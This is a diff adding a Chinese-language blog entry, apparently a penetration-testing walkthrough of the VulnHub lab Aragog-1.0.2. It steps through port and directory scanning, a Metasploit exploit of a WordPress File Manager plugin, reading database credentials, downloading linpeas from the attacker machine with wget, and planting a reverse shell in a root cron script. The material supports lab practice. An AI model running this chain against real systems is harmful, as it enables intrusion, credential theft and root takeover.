@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>渗透 | 靶机Aragog-1.0.2本地定时执行脚本提权到root</title>
+    <link href="/2022/05/06/Aragog-1-0-2/"/>
+    <url>/2022/05/06/Aragog-1-0-2/</url>
+    
+    <content type="html"><![CDATA[<p><strong>靶机介绍</strong></p><p>下载地址：<strong><a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">https://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></strong><br> 作者Mansoor R在VulnHub上上传了哈利波特系列的三个靶机，以哈利波特为故事背景，玩家需要找到这三个靶机中的共8个魂器，打败伏地魔！这就冲起来！<br> 首先是第一个靶机Aragog，以《哈利波特·密室》中的海格饲养的大蜘蛛阿拉戈命名，题目中提示这个靶机里面有两个魂器。</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p><strong>获取ip</strong></p><p>从VlunHub上下载靶机，在virtualbox上打开，设置网络模式为<a href="https://so.csdn.net/so/search?q=%E6%A1%A5%E6%8E%A5&spm=1001.2101.3001.7020">桥接</a>，让靶机和kali以及主机在一个局域网里。</p><p>我们挑战的第一步是先进行主机发现 <strong>arp-scan -l</strong> </p><p><img src="https://img-blog.csdnimg.cn/8fc8f05b47e4448689b529cc8fed4055.png" alt="img"></p><p>PCS Systemtechnik GmbH这一行就是靶机的IP。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>接下来，扫描开放端口以了解目标上暴露的服务</p><p>nmap -A -T4 -p- 172.16.53.58</p><h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/e93551a0caf54b84b8ffcfca390aa6cc.png" alt="img"></h2><h3 id="它向我展示了目标上只有-HTTP-和ssh可用"><a href="#它向我展示了目标上只有-HTTP-和ssh可用" class="headerlink" title="它向我展示了目标上只有 HTTP 和ssh可用"></a>它向我展示了目标上只有 HTTP 和ssh可用</h3><h3 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h3><p>只有一张图片</p><p><img src="https://img-blog.csdnimg.cn/44af5a7350e741c3b78cf8ef54774038.png" alt="img"></p><p>爆破一下网站目录 </p><p><strong>dirb</strong> <a href="http://172.16.53.58/"><strong>http://172.16.53.58</strong></a></p><p><img src="https://img-blog.csdnimg.cn/4b8d40bbe49f433f998b649fbbd2a28e.png" alt="img"></p><p>我们尝试访问blog这个目录</p><p><img src="https://img-blog.csdnimg.cn/014f5855aaef43cd91a8e119b013970a.png" alt="img"></p><p>我们能发现这个站点是利用wordpress搭建的</p><p>既然是wordpress，我决定用wpscan枚举一下</p><p>(ps：wpscan是一个扫描WordPress漏洞的扫描器)</p><p>去注册个免费的账号获取api-token</p><p><a href="https://wpscan.com/">https://wpscan.com/</a></p><p>wpscan –api-token&#x3D;$WPTOKEN –url&#x3D;<a href="http://172.16.53.58/blog/">http://172.16.53.58/blog/</a> -e p –plugins-detection aggressive</p><p><img src="https://img-blog.csdnimg.cn/7d66a189443d4243b6b4fcbe19f97688.png" alt="img"></p><p>扫出3个问题，全是File Manager的漏洞  </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="msf-getshell"><a href="#msf-getshell" class="headerlink" title="msf getshell"></a>msf getshell</h3><p>msf检索漏洞exp</p><p><img src="https://img-blog.csdnimg.cn/a0b24efefbba4ef6a92edf9ae93b0978.png" alt="img"></p><p><strong>search wordpress File Manager</strong> </p><p><strong>use 0</strong></p><p><strong>set rhosts 172.16.53.58</strong></p><p><strong>set targeturi &#x2F;blog</strong></p><p><strong>set lhost 172.16.53.31</strong></p><p><strong>run</strong></p><p><img src="https://img-blog.csdnimg.cn/43af57635d8f4c98bcf02e2d92828527.png" alt="img"></p><p>我们成功拿到了shell</p><p>我们利用python打开一个交互式</p><p><strong>python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong></p><p>wordpress搭建的网站mysql账号密码会记录在&#x2F;etc&#x2F;wordpress目录里的config-default.php 文件里面</p><p>在里面看到了数据库的root密码</p><p><img src="https://img-blog.csdnimg.cn/0dd76ad346cd4a539b011f01bc3709d7.png" alt="img"></p><p>通过账密登录MySQL数据库</p><p>在wordpress数据库下，wp_users表中找到一个登录记录</p><p><img src="https://img-blog.csdnimg.cn/7b5eb26bb0154646b31f145461f05cb1.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/66fd63e7bfff469386746a266bcb0b20.png" alt="img"></p><p>解密后我们得到了账号的密码</p><p>尝试ssh登录</p><p><img src="https://img-blog.csdnimg.cn/134e4f6199434a0b9280a230aa9b1709.png" alt="img"></p><p>成功登录</p><p>我们在当前目录下发现了第一个魂器</p><p><img src="https://img-blog.csdnimg.cn/0bf09f24565d4ee586a1676aa5ad63a6.png" alt="img"></p><p><strong>提权</strong></p><p>我们在kali上面启动一个python服务器</p><p><strong>python -m SimpleHTTPServer 2333</strong></p><p><img src="https://img-blog.csdnimg.cn/7efc0962b1794499a941776e164109b4.png" alt="img"></p><p>接下来利用wget 把提权漏洞检测脚本下载到靶机&#x2F;tmp这个目录下</p><p><strong>wget 172.16.53.31:2333&#x2F;linpeas.sh</strong></p><p><img src="https://img-blog.csdnimg.cn/ce3397b6bd6c4fd2bc190441269534c8.png" alt="img"></p><p>提升一下linpeas.sh 的权限  <strong>chmod 777 linpeas.sh</strong></p><p>执行一下 <strong>.&#x2F;linpeas.sh</strong></p><p><img src="https://img-blog.csdnimg.cn/217c01b15d7648dcbdd7164d05197876.png" alt="img"></p><p>运行脚本后发现了俩个CVE漏洞 经过实际测试都没能成功提权</p><p><img src="https://img-blog.csdnimg.cn/91e16e39f91d43b797053431513c89aa.png" alt="img"></p><p>在这一处我们能发现一个隐藏的脚本文件 .backup.sh</p><p>我们尝试去访问</p><p><img src="https://img-blog.csdnimg.cn/45a68bd7428140eaa64035a065c635cf.png" alt="img"></p><p>这个脚本的大概意思是，把上传的文件复制到tmp这个目录里  </p><p>属于每过一段时间就会自动运行的那种</p><p>在kali上下载pspy64,然后复制到靶机&#x2F;tmp目录下。<br> pspy64地址：<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><p>还是利用刚刚的方法wegt下载到靶机的tmp目录下</p><p>执行后我们能发现这个脚本的UID是0</p><p><img src="https://img-blog.csdnimg.cn/2f10851e1bf2428995aa93a4b5c15f7a.png" alt="img"></p><p>那说明我们向这个脚本写入反弹shell 就能获取到root权限了</p><p>创建反弹shell网站 <a href="https://www.revshells.com/">https://www.revshells.com/</a></p><p><img src="https://img-blog.csdnimg.cn/15a2294863154069b3ed069eb400862f.png" alt="img"></p><p>我们输入kali的ip地址就能生成一串反弹shell代码</p><p><img src="https://img-blog.csdnimg.cn/91068665893047ebb6bf37a8ad191228.png" alt="img"></p><p>把反弹shell的代码写入脚本文件中</p><p>在kali上进行监听</p><p><img src="https://img-blog.csdnimg.cn/dd65cb72d60d44a9931cea3b4d5ba97a.png" alt="img"></p><p>我们成功拿到了root权限</p><p>我们在当前目录下发现了第二个魂器</p><p><img src="https://img-blog.csdnimg.cn/dd7a4abdd6b34ab2993cfac26efc7a5c.png" alt="img"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>vulnhub</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Python爬取4k精美壁纸</title>
     <link href="/2022/04/27/%E7%88%AC%E8%99%AB/"/>
     <url>/2022/04/27/%E7%88%AC%E8%99%AB/</url>
